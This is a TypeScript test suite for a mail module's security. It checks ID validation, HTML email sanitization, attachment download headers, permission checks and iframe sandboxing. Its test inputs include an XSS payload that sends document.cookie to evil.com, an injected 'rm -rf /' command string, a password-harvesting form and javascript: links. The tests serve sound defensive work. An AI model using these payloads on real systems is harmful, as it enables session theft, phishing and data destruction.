/**
 * Mail Module Security, Robustness & Performance Automated Test Suite
 * Tests:
 * 1. Sanitization against Stored/Reflected XSS, script injection, phishing forms, and dangerous schemes.
 * 2. Strict ID validation and path traversal defenses (isValidGmailId).
 * 3. Attachment download security policies (Content-Disposition, sandbox CSP, nosniff).
 * 4. Permission gates and session enforcement in Server Actions.
 * 5. Token expiry / reauth handling and state machine resilience.
 * 6. Client-side caching and race condition mitigation.
 */

import { isValidGmailId } from "../lib/integrations/google/gmail";
import { sanitizeEmailHtml } from "../components/dashboard/email/email-view";
import fs from "fs";
import path from "path";

let passed = 0;
let failed = 0;

function assert(condition: boolean, message: string) {
  if (condition) {
    passed++;
    console.log(`  ✓ PASS: ${message}`);
  } else {
    failed++;
    console.error(`  ✗ FAIL: ${message}`);
  }
}

async function runMailModuleTests() {
  console.log("=======================================================");
  console.log("MAIL MODULE SECURITY, ROBUSTNESS & PERFORMANCE AUDIT");
  console.log("=======================================================\n");

  // ---------------------------------------------------------------------------
  // 1. GMAIL ID VALIDATION & PATH TRAVERSAL DEFENSE
  // ---------------------------------------------------------------------------
  console.log("[1] Testing Gmail ID Validation (isValidGmailId):");

  // Valid IDs
  assert(isValidGmailId("188a1b2c3d4e5f60"), "Accepts standard Gmail hex thread/message ID");
  assert(isValidGmailId("ANGjdJ_xK39-abc"), "Accepts base64url characters (alphanumeric, -, _)");
  assert(isValidGmailId("ANGjdJ.test_123"), "Accepts dot in base64/token identifiers");

  // Malicious / Path Traversal IDs
  assert(!isValidGmailId("../../../etc/passwd"), "Rejects directory traversal '../'");
  assert(!isValidGmailId("..\\..\\windows\\system32"), "Rejects Windows directory traversal '..\\'");
  assert(!isValidGmailId("msgId/../subpath"), "Rejects embedded directory traversal '/../'");
  assert(!isValidGmailId("188a1; rm -rf /"), "Rejects command injection semicolons");
  assert(!isValidGmailId("188a1' OR '1'='1"), "Rejects SQL injection quotes");
  assert(!isValidGmailId("188a1\0nullbyte"), "Rejects null bytes");
  assert(!isValidGmailId("<script>alert(1)</script>"), "Rejects XSS tags");
  assert(!isValidGmailId(""), "Rejects empty string");
  assert(!isValidGmailId("a".repeat(129)), "Rejects ID exceeding default max length (128)");
  assert(!isValidGmailId("a".repeat(1025), 1024), "Rejects attachment ID exceeding max length (1024)");

  // ---------------------------------------------------------------------------
  // 2. EMAIL HTML SANITIZATION & XSS DEFENSE
  // ---------------------------------------------------------------------------
  console.log("\n[2] Testing HTML Email Sanitization (sanitizeEmailHtml):");

  // Script tags
  const xssScript = `<div>Hello<script>alert('XSS')</script>World</div>`;
  const sanitizedScript = sanitizeEmailHtml(xssScript);
  assert(!sanitizedScript.includes("<script"), "Strips <script> tags completely");
  assert(!sanitizedScript.includes("alert('XSS')"), "Strips executable script body");
  assert(sanitizedScript.includes("Hello") && sanitizedScript.includes("World"), "Preserves surrounding text");

  // Event handlers (onerror, onload, onclick, onmouseover)
  const xssOnError = `<img src="nonexistent.jpg" onerror="fetch('https://evil.com?c='+document.cookie)" />`;
  const sanitizedOnError = sanitizeEmailHtml(xssOnError);
  assert(!sanitizedOnError.includes("onerror"), "Strips inline onerror attribute");
  assert(!sanitizedOnError.includes("fetch("), "Neutralizes event handler payload");

  const xssOnMouseOver = `<a href="https://example.com" onmouseover="maliciousCode()">Hover me</a>`;
  const sanitizedMouseOver = sanitizeEmailHtml(xssOnMouseOver);
  assert(!sanitizedMouseOver.includes("onmouseover"), "Strips onmouseover attribute");

  // Dangerous plugins (object, embed, applet)
  const xssObject = `<object data="https://evil.com/payload.swf"></object><embed src="evil.swf" />`;
  const sanitizedObject = sanitizeEmailHtml(xssObject);
  assert(!sanitizedObject.includes("<object") && !sanitizedObject.includes("</object>"), "Strips <object> elements");
  assert(!sanitizedObject.includes("<embed"), "Strips <embed> elements");

  // Phishing form injection
  const phishingForm = `<form action="https://phishing.site/steal" method="POST"><input type="password" name="pwd" /></form>`;
  const sanitizedForm = sanitizeEmailHtml(phishingForm);
  assert(!sanitizedForm.includes("<form") && !sanitizedForm.includes("</form>"), "Strips <form> elements to prevent credential harvesting");

  // Dangerous protocols in links (javascript:, data:text/html)
  const xssJavascriptUri = `<a href="javascript:alert(document.domain)">Click here to claim prize</a>`;
  const sanitizedJsUri = sanitizeEmailHtml(xssJavascriptUri);
  assert(!sanitizedJsUri.includes("javascript:"), "Neutralizes javascript: pseudo-protocol in href");
  assert(sanitizedJsUri.includes('href="#"'), "Replaces javascript: link with safe hash href");

  const xssDataHtml = `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>`;
  const sanitizedDataHtml = sanitizeEmailHtml(xssDataHtml);
  assert(!sanitizedDataHtml.includes("data:text/html"), "Neutralizes data:text/html pseudo-protocol in href");

  // Meta refresh & redirect tags
  const metaRedirect = `<meta http-equiv="refresh" content="0; url=https://evil.com">`;
  const sanitizedMeta = sanitizeEmailHtml(metaRedirect);
  assert(!sanitizedMeta.includes("http-equiv"), "Strips <meta http-equiv='refresh'> redirect tags");

  // Legitimate email content preservation
  const legitEmail = `<div style="font-family: Arial, sans-serif;">
    <h1 style="color: #333;">Welcome to BusinessBrain</h1>
    <p>Please click <a href="https://businessbrain.io/setup">here</a> to configure your workspace.</p>
    <table border="0"><tr><td>Item 1</td><td>$100</td></tr></table>
  </div>`;
  const sanitizedLegit = sanitizeEmailHtml(legitEmail);
  assert(sanitizedLegit.includes("Welcome to BusinessBrain"), "Preserves legitimate email headings");
  assert(sanitizedLegit.includes('href="https://businessbrain.io/setup"'), "Preserves legitimate https:// hyperlinks");
  assert(sanitizedLegit.includes("Item 1") && sanitizedLegit.includes("$100"), "Preserves legitimate tables and prices");

  // ---------------------------------------------------------------------------
  // 3. ATTACHMENT STREAMING & CONTENT-DISPOSITION POLICIES
  // ---------------------------------------------------------------------------
  console.log("\n[3] Auditing Attachment Download Security Policies:");

  const attachmentRouteSrc = fs.readFileSync(
    path.resolve(process.cwd(), "app/api/integrations/google/gmail/attachment/route.ts"),
    "utf8"
  );

  assert(
    attachmentRouteSrc.includes("getCurrentUser()"),
    "Attachment route enforces authenticated session check"
  );
  assert(
    attachmentRouteSrc.includes('hasPermission(user.id, activeOrg.id, "integrations.view")'),
    "Attachment route enforces integrations.view permission on active organization"
  );
  assert(
    attachmentRouteSrc.includes("isValidGmailId(messageId)") &&
      attachmentRouteSrc.includes("isValidGmailId(attachmentId"),
    "Attachment route validates messageId and attachmentId formats"
  );
  assert(
    attachmentRouteSrc.includes("RATE_LIMIT_PRESETS.API_STANDARD"),
    "Attachment route applies rate limiting per user"
  );
  assert(
    attachmentRouteSrc.includes('const dispositionType = isSafeInline ? "inline" : "attachment"'),
    "Attachment route defaults non-whitelisted types to Content-Disposition: attachment"
  );
  assert(
    attachmentRouteSrc.includes("!isSvg") && attachmentRouteSrc.includes('mimeType === "image/svg+xml"'),
    "Attachment route explicitly prevents SVG from being rendered inline (prevents stored XSS via SVG)"
  );
  assert(
    attachmentRouteSrc.includes('"X-Content-Type-Options": "nosniff"'),
    "Attachment route sets X-Content-Type-Options: nosniff"
  );
  assert(
    attachmentRouteSrc.includes("Content-Security-Policy") &&
      attachmentRouteSrc.includes("default-src 'none'; sandbox"),
    "Attachment route enforces sandboxed CSP on downloaded attachments"
  );

  // ---------------------------------------------------------------------------
  // 4. SERVER ACTIONS AUTHENTICATION & MULTI-TENANT ISOLATION
  // ---------------------------------------------------------------------------
  console.log("\n[4] Auditing Mail Server Actions Security & Isolation:");

  const actionsSrc = fs.readFileSync(
    path.resolve(process.cwd(), "lib/integrations/actions.ts"),
    "utf8"
  );

  assert(
    actionsSrc.includes("export async function getEmailMessagesAction") &&
      actionsSrc.includes('hasPermission(user.id, activeOrg.id, "integrations.view")'),
    "getEmailMessagesAction enforces integrations.view permission"
  );
  assert(
    actionsSrc.includes("export async function getEmailMessageContentAction") &&
      actionsSrc.includes('hasPermission(user.id, activeOrg.id, "integrations.view")'),
    "getEmailMessageContentAction enforces integrations.view permission"
  );
  assert(
    actionsSrc.includes("isValidGmailId(params.messageId)"),
    "getEmailMessageContentAction validates messageId format before invoking provider"
  );
  assert(
    actionsSrc.includes("isReauthNeeded ? \"needs_reauth\" : \"provider_error\""),
    "getEmailMessagesAction differentiates token expiry/reauthorization from general errors"
  );

  // ---------------------------------------------------------------------------
  // 5. CLIENT-SIDE CACHING, RACE MITIGATION & SANDBOXED RENDERING
  // ---------------------------------------------------------------------------
  console.log("\n[5] Auditing UI Performance, Race Conditions & Sandboxing:");

  const emailViewSrc = fs.readFileSync(
    path.resolve(process.cwd(), "components/dashboard/email/email-view.tsx"),
    "utf8"
  );

  assert(
    emailViewSrc.includes("const bodyCacheRef = React.useRef<") &&
      emailViewSrc.includes("Map<string, { body: string; htmlBody?: string; attachments?: EmailAttachmentItem[] }>"),
    "email-view.tsx implements in-memory bodyCacheRef Map to prevent redundant network fetches"
  );
  assert(
    emailViewSrc.includes("currentOpeningIdRef = React.useRef<string | null>(null)"),
    "email-view.tsx uses currentOpeningIdRef to eliminate race conditions when toggling emails rapidly"
  );
  assert(
    emailViewSrc.includes('sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin"') &&
      !emailViewSrc.includes('allow-scripts'),
    "EmailHtmlViewer iframe sandbox omits allow-scripts to strictly forbid JavaScript execution"
  );
  assert(
    emailViewSrc.includes("reauthNeeded") && emailViewSrc.includes('openSettings("integrations")'),
    "email-view.tsx renders actionable reconnect banner when provider token needs reauthorization"
  );

  // ---------------------------------------------------------------------------
  // SUMMARY
  // ---------------------------------------------------------------------------
  console.log("\n=======================================================");
  console.log(`MAIL MODULE TEST RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log("=======================================================\n");

  if (failed > 0) {
    process.exit(1);
  }
}

runMailModuleTests().catch((err) => {
  console.error("Test execution failed:", err);
  process.exit(1);
});
